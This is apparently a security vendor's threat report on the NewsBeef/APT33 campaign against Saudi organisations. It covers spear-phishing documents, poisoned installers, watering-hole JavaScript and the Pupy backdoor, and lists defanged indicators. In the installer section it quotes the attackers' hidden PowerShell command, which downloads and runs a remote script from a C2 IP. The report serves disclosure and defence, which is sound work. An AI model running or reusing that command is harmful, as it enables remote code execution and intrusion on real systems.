APT reports

‘Twas the night before {.entry-title}
======================

By GReAT on July 4, 2019. 3:48 pm

Recently, the United States Cyber Command (USCYBERCOM Malware Alert
@CNMF_VirusAlert) highlighted several VirusTotal uploads of theirs – and
the executable objects relating to 2016 – 2017 NewsBeef/APT33 activity
are interesting for a variety of reasons. Before continuing, it’s
important to restate yet again that we defend customers, and research
malware and intrusions, regardless of their source. Accordingly,
subscribers to our private APT intelligence reports receive unique and
extraordinary data on the significant activity and campaigns of over 100
APTs from all over the world, including this 2016-2017 NewsBeef /APT33
activity.

USCYBERCOM’s VirusTotal executable object uploads appeared in our
January 2017 private report “NewsBeef Delivers Christmas Presence”, an
examination of a change in the tactics used in spear-phishing and
watering hole attacks against Saudi Arabian targets. Two files uploaded
by USCYBERCOM are of particular interest. These were first seen Dec 2016
and Jan 2017:

Trojan-Downloader.PowerShell.Agent.ah, DangerousObject.Multi.Generic

In order to share insight into Cyber Command’s highlighted malware and
its context, some of our private report’s content will be re-written
here. The January 2017 report followed up on other private reports
published on the group’s BeEF-related activity in 2015 and 2016. All of
them cover a thread of mid-2015 activity continuing into 2016, then
resetting and advancing in 2016 and into 2017. Bear in mind that
regardless of current leaks, which do not always present exhaustive
information on group participants, activity from the region has had
multiple overlaps and presents a confusion of internal dynamics…

NewsBeef Delivers Christmas Presence
------------------------------------

Examination of a change in tactics used in spearphishing and watering
hole attacks against Saudi Arabian targets

Executive summary

The NewsBeef APT previously engaged in long-term, elaborate social
engineering schemes that take advantage of popular social network
platforms. Previous analysis of the NewsBeef APT indicates that the
group focuses on Saudi Arabian (SA) and Western targets, and lacks
advanced offensive technology development capabilities.

In previous campaigns, NewsBeef relied heavily on its namesake
technology, the Browser Exploitation Framework (BeEF). However, in the
summer of 2016, the group deployed a new toolset that includes
macro-enabled Office documents, PowerSploit, and the Pupy backdoor. The
most recent NewsBeef campaign uses this toolset in conjunction with
spearphishing emails, links sent over social media/standalone private
messaging applications, and watering hole attacks that leverage
compromised high-profile websites (some belonging to the SA government).
The group changed multiple characteristics year over year – tactics, the
malicious JavaScript injection strategically placed on compromised
websites, and command and control C2 infrastructure. 

In a nutshell:

-   The NewsBeef actor deployed a new toolset in a campaign that focused
    primarily on Saudi Arabian targets;
-   BeEF does not appear to be deployed as a part of the current
    campaign;
-   Compromised government and infrastructure-related websites are
    injected with JavaScript that geolocates and redirects visitors to
    spoofed, attacker-controlled web-servers;
-   Improvements in JavaScript injection and obfuscation may extend
    server persistence;
-   NewsBeef continues to deploy malicious macro-enabled Office
    documents, poisoned legitimate Flash and Chrome installers,
    PowerSploit, and Pupy tools

Technical Analysis

The NewsBeef campaign is divided into two main attack vectors,
spearphishing and strategic web compromise (watering hole) attacks. The
group’s spearphishing component uses malicious, macroenabled, Microsoft
Office documents that deliver PowerShell scripts. The scripts download
poisoned installers (e.g. Flash, Citrix Client, and Chrome) from an
online presence (in at least one case, the group spoofed a legitimate,
well-known IT services organization). Once the installer is downloaded
to a victim machine, it runs PowerSploit scripts that in turn download
and execute a full-featured Pupy backdoor.

On December 25, 2016, the NewsBeef APT stood up a server to host a new
set of Microsoft Office documents (maintaining malicious macros and
PowerShell scripts) to support its spear-phishing operations. The group
sent these documents (or links to them) to targets via email, and over
social network and standalone messaging clients.

To compromise websites and servers, the group identified vulnerable
sites and injected obfuscated JavaScript that redirected visitors to
NewsBeef-controlled hosts (which tracked victims and served malicious
content). These compromised servers include Saudi Arabian government
servers and other high-value organizational identities relevant to their
targets.

Targets, social engineering, delivery chain

The majority of NewsBeef targets that our researchers have observed are
located in SA. Targeting profiles include:

-   Government financial and administrative organizations
-   Government health organizations
-   Engineering and technical organizations
-   One British labor related government organization (targeted multiple
    times)

The bulk of the targets were affected through strategic web compromises,
especially via compromised government servers. However, Kaspersky
Security Network (KSN) records also contain links that victims clicked
from the Outlook web client “outlook.live.com” as well as attachments
arriving through the Outlook desktop application. This behavior falls in
line with previous NewsBeef operations, where the group used other
standalone messaging clients to send malicious links. Interestingly,
NewsBeef set up its server using the hosting provider “Choopa, LLC, US”,
the same hosting provider that the group used in attacks over the summer
of 2016.

[]

The domain “ntg-sa[.]com” appears to be an attempt by the NewsBeef actor
to spoof the legitimate Saudi IT services organization, “National
Technology Group” (NTG) at, “ntg.com[.]sa”. The malicious documents
served at the spoofed website are shown below:

[]

NTG is a legitimate company that provides IT services and support to SA
government organizations and communications firms (as well as
international financial groups and retailers), making it a high-value
identity. Spoofing the identity of an IT service provider is a
particularly important asset to threat actors that can abuse the
inherent trust of IT organizations to push software (which may appear
suspicious if served from another source). NTG’s IT focus and client
list likely aided NewsBeef’s delivery of malicious PowerShell-enabled
Office documents and poisoned installers.

[]

In December 2016, the following active URLs were served from the spoofed
NTG identity. All of the poisoned installers are technologies that an IT
support service may be expected to deliver.

hxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe  
 hxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe  
 hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe

In this scenario, the poisoned Flashplayer, Citrix, or Chrome installer
drops the file “install.bat”. The batch file runs the PowerShell
command:

powershell.exe -w hidden -noni -nop -c “iex(New-Object  

System.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′)

The command downloads “eiloShaegae1”, another PowerShell downloader
script. This second PowerShell downloader script downloads and runs the
payload; a PowerSploit ReflectivePEInjection script,
“hxxp://139.59.46[.]154:3485/IMo8oosieVai”.

The script maintains and then decodes a base64 string. This base64
string, is the Pupy backdoor DLL, which is loaded and run in-memory,
never touching the disk. This Pupy backdoor immediately communicates
with 139.59.46[.1]54 over obfs3, posting collected system data and
retrieving commands.

This selection of “The Threebfuscator” for command and control (C2)
communications is interesting, because it is an obfuscating protocol
used to mask Tor communications. It is possible that the use of obfs3
indicates the attackers’ understanding of its effectiveness against
outbound connection monitoring.

Another notable spoofed domain used during this campaign is the
“maps-modon[.]club” domain. The domain “maps.modon.gov[.]sa” was
compromised in December 2016, and the “maps-modon[.]club” domain created
on December 8, 2016. The domain shared the same IP address
(45.76.32[.]252) as “ntg-sa[.]com”. Although we did not observe any
malicious documents retrieved from that domain, it is likely that the
domain served the same documents as ntg-sa[.]com. The filenames of the
malicious Office documents (hosted at the spoofed NTG site) are relevant
to typical IT and contracting resources and indicate that this scheme
relies on effective social engineering tactics related to human
resources and IT activities.

[]

In other schemes, the attackers sent macro-enabled Office attachments
from spoofed law firm identities (or other relevant service providers)
to targets in SA. The law firm in this scheme is based in the United
Kingdom and is the sole location for targets outside of SA for this
campaign. Below is a screenshot of a fake legal proposal in Word doc
format, containing malicious macros and PowerShell code.

[]

The malicious document follows the same chain as the poisoned Flash
player or Chrome Installer:

[]

Compromised servers and injected JavaScript

Starting in October 2016, NewsBeef compromised a set of legitimate
servers (shown below), and injected JavaScript to redirect visitors to
hxxp://analytics-google[.]org:69/Check.aspx:

[]

The entire list of compromised servers is exclusively Saudi Arabian, and
includes organizations from the following industries:

-   Energy services for industrial processes
-   Telecom engineering and implementation services
-   Shipping and logistics
-   Metal engineering and manufacturing
-   Information technology services
-   Cement and building materials

These recent attacks against legitimate servers (when compared to
previous NewsBeef activity) indicate that NewsBeef operators have
improved their technical skills, specifically their ability to covertly
inject JavaScript code into served web pages. Their injection and
obfuscation techniques enable the actor to serve the same JavaScript
with every page visit to the “watering hole” site as well as increase
the difficulty of identifying the malicious JavaScript source on
compromised sites.

For example, on a Saudi government website, the NewsBeef APT delivered
packed JavaScript into the bottom of a referenced script that is
included in every page served from the site (the packed and unpacked
JavaScript is shown below). The JavaScript forces visiting web browsers
to collect and send (via a POST request) web browser, browser version,
country of origin, and IP address data to the attacker controlled server
“jquerycodedownload[.]live/check.aspx”.

It is likely that this collection of visitor information represents an
attempt to limit the number of infections to a specific target subset
and reduce the attacker’s operational footprint. Although we did not
identify injected JavaScript related to the
“analytics-google[.]org/check.aspx” redirections, it is likely that it
performed similar data collection and exfiltration (via POST). This
technique appears to be an improvement over the simple .JPG beaconing
which researchers observed in previous NewsBeef watering hole attacks.
Packed JavaScript:

[]

[]

The most trafficked of the compromised sites (which redirect to
“jquerycode-download[.]live”) appears to be the government site at
“scsb.gov[.]sa/portal/”. A high volume of redirections from the
compromised site continues into mid-January 2017.

Below is a list of compromised websites and the associated URL that
serves the injected, second layer JavaScript. Note that the JavaScript
resource changes on every compromised website among many other
referenced JavaScript sources, making it difficult to track down the
source of the malicious script per site:

[]

www.taqa.com[.]sa/Scroll-jquery.js

[]

199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.js

Multiple other relevant sites were compromised and redirecting as well.

The Pupy backdoor

Pupy is an open source, multi-platform (Windows, Linux, OSX, Android),
multi-function backdoor. The backdoor is mainly written in Python and
uses code from other open source attack tools like PowerSploit,
Mimikatz, laZagne, etc. Pupy can generate backconnect or bindport
payloads in multiple formats: PE executables (x86/x64) for Windows, ELF
binary/.so for Linux, reflective DLLs (x86/x64), pure Python files,
PowerShell, apk, and Rubber Ducky script (Windows).

The malicious DLL deployed by NewsBeef contains Python code, a Python
interpreter, and the MSVC runtime library as well as code that loads the
Python interpreter, runs Python code and exports some functions for
Python. A configuration string contains base64-encoded Python code
(packed with zlib) with transport configuration and information about C2
server addresses.

When initiated, the Python code attempts to retrieve and use SOCKS/HTTP
proxy settings from the victim’s computer. The Python code then tries to
initiate a reverse connection to the C2 server (139.59.46[.]154:3543)
using a TCP protocol with RSA+AES traffic encryption and obfs3 transport
using default keys from Pupy sources.

After a successful connection, NewsBeef Pupy sends information about the
infected computer and waits for commands (which take the form of
modules) from the C2 server. The C2 server can send modules with Python
code and compiled Python C extensions. The main functionality of the
backdoor is implemented in packages (Python code, compiled Python C
extensions, compiled executable files) and modules (Python code).
Modules can directly access Python objects on the remote client using
the RPyC module. The Python modules win32com, win32api, and ctypes are
used to interact with the Win32 API. Attackers can use standard modules
or write their own. All modules are executed in the memory (a Pupy
process can migrate between processes using the corresponding module).

Conclusion
----------

Previous reports on the NewsBeef APT noted the group’s reliance on
open-source tools to launch simple, yet effective attacks. Historically,
the group has used BeEF to track targets and deliver malicious payloads.
However, as this recent campaign indicates, the NewsBeef APT appears to
have shifted its intrusion toolset away from BeEF and towards
macro-enabled malicious Office documents, PowerSploit, and Pupy. Despite
this shift in toolset, the group still relies on old infrastructure as
evidenced by their reuse of servers hosted by the service providers
Choopa and Atlantic.net.

The improvements in tactics, techniques and procedures appears to have
paid off. The most recent campaign indicates that the group was able to
compromise a larger number of sites including valuable, high-profile SA
government identities. However, despite these improvements in
technology, the NewsBeef APT continues to rely on social engineering
schemes and open-source tools – attributes that increase the chances of
identification.

NewsBeef attacks against Saudi Arabian organizations and individuals (as
well as targets in the European Union) are likely to continue.
Additionally, researchers expect that as the group evolves, its tasking
will expand to other organizations doing business with, or connected to
Saudi Arabian organizations and individuals.

Due to the group’s specific target set, it is crucial that SA security
teams, administrators, and developers (especially web application
administrators/developers) update their WordPress, Joomla, and
Drupal-based web applications and plugins – as these assets are actively
scanned and exploited by this APT.
